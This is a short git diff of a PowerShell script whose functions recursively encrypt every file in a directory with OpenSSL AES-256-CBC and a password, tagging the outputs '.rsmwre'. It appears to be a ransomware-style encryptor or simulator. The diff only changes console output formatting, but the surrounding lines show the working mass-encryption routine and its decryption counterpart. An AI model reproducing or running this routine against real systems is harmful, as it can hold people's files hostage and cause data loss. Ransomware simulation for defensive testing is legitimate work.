@@ -29,10 +29,10 @@ function Encrypt {
     )
     $fileScope = (Get-ChildItem -Path "$Directory" -File -Recurse).FullName
     ForEach ($inFile in $fileScope) {
-        Write-Host "Encrypting $inFile ..." -ForegroundColor Yellow -NoNewline
+        Write-Host "Encrypting $inFile ..." -ForegroundColor Yellow 
         $outFile = $inFile + '.rsmwre'
         .\OpenSSL.exe enc -aes-256-cbc -e -in $inFile -out $outFile -k $Pswd 
-        Write-Host "Done." -ForegroundColor Green -NoNewline
+        Write-Host "Done." -ForegroundColor Green 
     }
 }
 function Decrypt {
@@ -42,10 +42,10 @@ function Decrypt {
     )
     $fileScope = (Get-ChildItem -Path "$Directory/*.rsmwre" -File -Recurse).FullName
     ForEach ($inFile in $fileScope) {
-        Write-Host "Decrypting $inFile ..." -ForegroundColor Yellow -NoNewline
+        Write-Host "Decrypting $inFile ..." -ForegroundColor Yellow 
         $outFile = $inFile -replace ".rsmwre"
         .\OpenSSL.exe enc -aes-256-cbc -d -in $inFile -out $outFile -k $Pswd
-        Write-Host "Done." -ForegroundColor Green -NoNewline
+        Write-Host "Done." -ForegroundColor Green 
     }
 }
 
